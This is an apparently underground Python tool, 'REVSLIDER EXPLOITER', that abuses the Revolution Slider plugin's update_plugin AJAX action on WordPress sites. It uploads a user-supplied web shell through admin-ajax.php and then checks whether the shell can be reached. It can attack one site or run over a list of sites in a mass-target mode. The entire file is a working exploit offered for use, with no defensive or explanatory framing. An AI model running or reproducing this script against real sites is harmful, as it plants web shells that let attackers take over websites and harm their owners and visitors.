import requests
import sys
import os

R = '\033[31m'   # Red
N = '\033[1;37m' # White
G = '\033[32m'   # Green
O = '\033[0;33m' # Orange
B = '\033[1;34m' # Blue
C = '\033[36m' # cyan

def banner():
	print ("""
[-] \033[36m==== \033[0;33mREVSLIDER EXPLOITER \033[36m==== [-]
\033[0;33mAuthor    : \033[36mZekkel AR
\033[0;33mThanks TO : \033[36mDapa Haxor ~ Agung ~ Aalex ~ Sals ~ MR.RM19

[1] Single Target
[2] Mass Target
""")


class KyuRazz:
	def __init__(self):
		print("Target : Site.com/")
		self.mreks1k = input("[-] Target => ")
		self.shell = input("[-] Ur Shell => ")
		self.data = {'update_file':open(self.shell, "rb")}
		self.data2 = {'action':'revslider_ajax_action', 'client_action':'update_plugin'}

	def m0nalisa(self):
		try:
			self.exploit = (self.mreks1k+'/wp-admin/admin-ajax.php')
			nanang = requests.get(self.exploit).text
			if '0' in nanang:
				print ("[ LIVE  ] Revslider VULN")
				start = requests.post(self.exploit, files=self.data, data=self.data2)
				self.reks1 = ("wp-content/revslider/temp/update_extract/revslider/")
				mantap = requests.get(self.mreks1k+self.reks1+self.shell)
				kintaman = (self.mreks1k+self.reks1+self.shell)
				aniki = mantap.status_code
				if aniki == 200:
					print ("\033[0;33m[ \033[36mVULN \033[0;33m] {}" .format(kintaman))
				else:
					print ("\033[0;33m[ \033[36mDIE \033[0;33m] {}" .format(kintaman))
			else:
				print("Revslider Not Found")
			

		except KeyboardInterrupt:
			print ("GoodBye-^")
class mouse:
	def __init__(self):
		print("Target : Site.com/")
		self.mreks1k = input("[-] LIST => ")
		self.shell = input("[-] Ur Shell => ")
		self.data = {'update_file':open(self.shell, "rb")}
		self.data2 = {'action':'revslider_ajax_action', 'client_action':'update_plugin'}
	def FAC(self):
		self.taik = open(self.mreks1k, 'r').readlines()
		try:
			for i in self.taik:
				zz = i.strip()
				self.exploit = (zz+'/wp-admin/admin-ajax.php')
				start = requests.post(self.exploit, files=self.data, data=self.data2)
				self.reks1 = ("wp-content/revslider/temp/update_extract/revslider/")
				mantap = requests.get(zz+self.reks1+self.shell)
				kintaman = (zz+self.reks1+self.shell)
				aniko = mantap.status_code
				if aniko == 200:
					print ("\033[0;33m[ \033[36mVULN \033[0;33m] {}" .format(kintaman))
				else:
					print ("\033[36m[ \033[0;33mDIE \033[36m] {}" .format(kintaman))
		except KeyboardInterrupt:
			print ("Good Bye ^-^")
		except exception.MissingSchema:
			print ("[ ERROR ] {}" .format(kintaman))



if __name__ == "__main__":
	os.system('clear')
	banner()
	rr = input("CHOOSE UR NUMBER => ")
	if rr == '1':
		zekkelganteng = KyuRazz()
		zekkelganteng.m0nalisa()
	elif rr == '2':
		kakak = mouse()
		kakak.FAC()

